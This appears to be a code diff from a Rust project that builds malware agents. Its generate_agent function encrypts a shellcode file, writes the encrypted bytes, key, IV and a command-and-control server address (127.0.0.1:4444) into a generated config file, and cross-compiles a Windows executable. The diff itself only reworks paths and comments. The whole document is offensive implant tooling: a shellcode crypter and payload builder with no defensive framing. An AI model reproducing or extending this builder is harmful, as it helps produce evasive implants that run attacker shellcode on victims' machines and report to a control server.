@@ -36,6 +36,7 @@ pub fn encrypt_shellcode(shellcode: &[u8]) -> (Vec<u8>, Vec<u8>, Vec<u8>) {
     (encrypted_data.to_vec(), key, iv)
 }
 
+
 pub fn generate_agent(shellcode_file: &str, output_name: &str) -> Result<(), Box<dyn std::error::Error>> {
     // Read the shellcode file
     let mut file = File::open(shellcode_file)?;
@@ -49,44 +50,33 @@ pub fn generate_agent(shellcode_file: &str, output_name: &str) -> Result<(), Box
 
     println!("🔒 Shellcode encriptado: {} bytes", encrypted_data.len());
 
-    // ARREGLO: Detectar si estamos en target/release/ y ajustar la ruta
-    let agent_path = if std::env::current_dir()?.to_string_lossy().contains("target/release") {
-        "../../agent"  // Desde target/release/ ir a la raíz del proyecto
-    } else {
-        "agent"        // Si estamos en la raíz del proyecto
-    };
-
     // Crear directorios si no existen
-    let config_dir = format!("{}/src", agent_path);
-    std::fs::create_dir_all(&config_dir)?;
+    std::fs::create_dir_all("../agent/src")?;
 
     // Generar config.rs dentro del crate `agent`
-    let config_file_path = format!("{}/src/config.rs", agent_path);
-    let mut config_file = File::create(&config_file_path)?;
+    let mut config_file = File::create("../agent/src/config.rs")?;
     writeln!(config_file, "pub const ENCRYPTED_SHELLCODE: &[u8] = &{:?};", encrypted_data)?;
     writeln!(config_file, "pub const KEY: &[u8] = &{:?};", key)?;
     writeln!(config_file, "pub const IV: &[u8] = &{:?};", iv)?;
-    writeln!(config_file, "pub const C2_SERVER: &str = \"127.0.0.1:4444\";")?;
+    writeln!(config_file, "pub const C2_SERVER: &str = \"127.0.0.1:4444\";")?; // Agregar servidor C2
 
-    println!("✅ Configuración escrita en {}", config_file_path);
+    println!("✅ Configuración escrita en ../agent/src/config.rs");
 
-    // Compilar el crate agent
+    // Compilar el crate agent (cambiar directorio de trabajo)
     let output = Command::new("cargo")
         .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
-        .current_dir(agent_path) // Usar la ruta ajustada
+        .current_dir("../agent") // Ejecutar desde el directorio del agente
         .output()?;
 
     if output.status.success() {
         println!("✅ Compilación exitosa!");
-        let exe_path = format!("{}/target/x86_64-pc-windows-gnu/release/agent.exe", agent_path);
+        let exe_path = format!("../agent/target/x86_64-pc-windows-gnu/release/agent.exe");
         println!("🏃 Ejecutable generado en {}", exe_path);
         
         // Copiar el ejecutable al directorio actual con el nombre deseado
         let dest_path = format!("{}.exe", output_name);
         if let Ok(_) = std::fs::copy(&exe_path, &dest_path) {
             println!("📦 Ejecutable copiado como: {}", dest_path);
-        } else {
-            println!("⚠️  No se pudo copiar el ejecutable, pero está disponible en: {}", exe_path);
         }
     } else {
         println!("❌ Error durante la compilación:");
